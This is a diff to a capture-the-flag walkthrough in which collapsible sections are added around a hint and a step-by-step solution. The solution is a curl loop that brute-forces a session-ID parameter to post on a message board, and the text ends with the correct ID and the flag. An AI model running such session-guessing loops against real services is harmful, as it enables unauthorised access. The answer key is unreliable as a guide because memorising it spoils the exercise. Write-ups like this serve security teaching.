@@ -6,15 +6,25 @@ With a bit of detective work we've managed to find the message board and get Ben
 
 **Tip:** Successfully post a notice on the board to get the flag.
 
+<details><summary>
+
+## Need a hint?</summary>
+
 ```txt
 💡 Hint: There seems to be a required parameter - "sessID" - requiring a number. There aren't too many users,
    maybe try brute forcing this value. You could do that in Python or you could write a BASH script using CURL.
 ```
 
-## Step by Step
+</details>
+
+<details><summary>
+
+## Step by Step</summary>
 
 - Open a Linux terminal
 - Run `for i in {1..100}; do curl -X POST -d "userID=24&sessID=$i" https://bondogge.com/createPost; echo ""; done`
 - This will eventually reach to correct sessID of `78` and spit out the flag
 
 `flag: br1ti5h.bulld0gZ`
+
+</details>
